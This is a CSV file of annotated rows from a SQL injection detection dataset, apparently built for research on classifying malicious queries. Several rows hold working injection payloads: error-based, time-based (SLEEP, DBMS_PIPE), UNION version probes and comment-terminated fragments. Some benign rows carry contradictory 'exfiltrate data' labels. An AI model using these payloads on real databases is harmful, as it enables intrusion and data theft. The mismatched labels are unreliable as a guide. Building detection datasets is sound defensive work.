row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row
9686,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '","1%' ) ) AND ( SELECT 2* ( IF ( ( SELECT * FROM ( SELECT CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 3484 = 3484,1 ) ) ) ,0X717A767A71,0X78 ) ) S ) , 8446744073709551610, 8446744073709551610 ) ) ) AND ( ( '%' = '",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False
5544,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '","1%' AND ELT ( 1210 = 1210,SLEEP ( 5 ) ) AND '%' = '",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False
29542,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,"INSERT INTO paper  ( plant, potatoes, powder )  VALUES  ( 'willing', 'stood', 'ice' )","INSERT INTO PAPER ( PLANT, POTATOES, POWDER ) VALUES ( 'WILLING', 'STOOD', 'ICE' )",full_query,INSERT,"paper, paper ( plant, potatoes, powder )",,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T2,integrity,insert unauthorized records,insert unauthorized records into paper,write_query,integrity,False,False,False,False,False,False,False,False,False,False
3885,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,1 ) AS JVMV WHERE 3857 = 3857 AND ( 5717 = 6483 ) *6483--,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False
10869,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'bgdp'  =  'bgdp","1' ) ) AND ( SELECT 2* ( IF ( ( SELECT * FROM ( SELECT CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 3484 = 3484,1 ) ) ) ,0X717A767A71,0X78 ) ) S ) , 8446744073709551610, 8446744073709551610 ) ) ) AND ( ( 'BGDP' = 'BGDP",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False
640,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1","SELECT * FROM USERS WHERE ID = 1 OR @#""{ = 1 UNION SELECT 1,VERSION ( ) -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from users,union_based,confidentiality,True,True,False,True,False,False,False,False,False,False
4516,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1 WHERE 7240 = 7240 OR 6979 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False
23807,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,SELECT citizen ( s )  FROM news SELECT distant FROM hall,SELECT CITIZEN ( S ) FROM NEWS SELECT DISTANT FROM HALL,full_query,SELECT,"news, hall",,B,legitimate,query legitimate records,read legitimate data from news,B,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from news,subquery_based,confidentiality,False,True,False,False,False,False,False,False,False,False
28512,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,SELECT AVG ( harbor ) FROM slipped SELECT SUM ( brush ),SELECT AVG ( HARBOR ) FROM SLIPPED SELECT SUM ( BRUSH ),full_query,SELECT,slipped,,B,legitimate,query legitimate records,read legitimate data from slipped,B,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from slipped,subquery_based,confidentiality,False,True,False,False,False,False,False,False,False,False
573,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1","SELECT * FROM USERS WHERE ID = 1<@<@ UNION SELECT 1,VERSION ( ) -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from users,union_based,confidentiality,True,True,False,True,False,False,False,False,False,False
21379,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,DELETE FROM white,DELETE FROM WHITE,full_query,DELETE,white,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T3,availability/integrity,delete unauthorized records,delete records from white,write_query,availability/integrity,False,False,False,False,False,False,False,False,False,False
25580,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,SELECT outline FROM worker UNION ALL SELECT start FROM soap ORDER BY dot,SELECT OUTLINE FROM WORKER UNION ALL SELECT START FROM SOAP ORDER BY DOT,full_query,SELECT,"worker, soap",outline,B,legitimate,query legitimate records,read legitimate data from worker,B,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from worker,subquery_based,confidentiality,False,True,False,False,False,False,False,False,False,False
3995,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#","1' ) ) AS ORVY WHERE 7270 = 7270 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False
21738,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,SELECT enemy ( s )  FROM five SELECT wrong FROM wind,SELECT ENEMY ( S ) FROM FIVE SELECT WRONG FROM WIND,full_query,SELECT,"five, wind",,B,legitimate,query legitimate records,read legitimate data from five,B,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from five,subquery_based,confidentiality,False,True,False,False,False,False,False,False,False,False
4923,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd","1' AND MAKE_SET ( 8403 = 8403,8899 ) AND 'FTTD' LIKE 'FTTD",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False
2273,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1 ) ) AS JRZR WHERE 5194 = 5194 AND CHAR ( 107 ) ||CHAR ( 121 ) ||CHAR ( 97 ) ||CHAR ( 80 ) = REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False
4252,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1"" WHERE 2989 = 2989 OR 8421 = ( SELECT COUNT ( * ) FROM GENERATE_SERIES ( 1,5000000 ) ) --",injection_fragment,UNKNOWN,generate_series,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False
6751,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1' ) AND 8148 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False
10952,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )    order by 1#,1 ) ) ORDER BY 1#,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False
1605,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --","1"" WHERE 3678 = 3678 AND 6537 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 76 ) ||CHR ( 116 ) ||CHR ( 117 ) ||CHR ( 65 ) ,5 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False
